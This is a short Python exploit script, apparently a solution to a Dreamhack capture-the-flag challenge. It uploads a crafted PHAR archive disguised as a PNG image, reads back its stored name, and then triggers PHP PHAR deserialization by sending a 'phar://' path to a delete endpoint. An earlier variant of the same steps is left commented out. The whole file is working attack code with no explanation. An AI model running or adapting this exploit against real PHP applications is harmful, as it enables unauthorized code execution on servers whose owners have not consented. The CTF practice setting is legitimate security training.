url = 'http://host1.dreamhack.games:12133'

import requests

# fb = open('exploit1.phar', 'rb').read()
# res = requests.post(url+'/report.php', files={'file': ('test.png', fb, 'image/png')}, data={'title':'test', 'content': 'test'})
# png = res.text.strip("<script>alert('").split("'")[0]
# print(">> ",url+'/report.php',"request", png)

# res = requests.post(url+'/delete.php', data={'title':'phar://uploads/'+png})
# print(">> ",url+'/delete.php',"request", res.text)

fb = open('exploit2.phar', 'rb').read()
res = requests.post(url+'/report.php', files={'file': ('test.png', fb, 'image/png')}, data={'title':'test', 'content': 'test'})
png = res.text.strip("<script>alert('").split("'")[0]
print(">> ",url+'/report.php',"request", png)

res = requests.post(url+'/delete.php', data={'title':'phar://uploads/'+png})
print(">> ",url+'/delete.php',"request", res.text)

input_code = "windows" # md5 creack
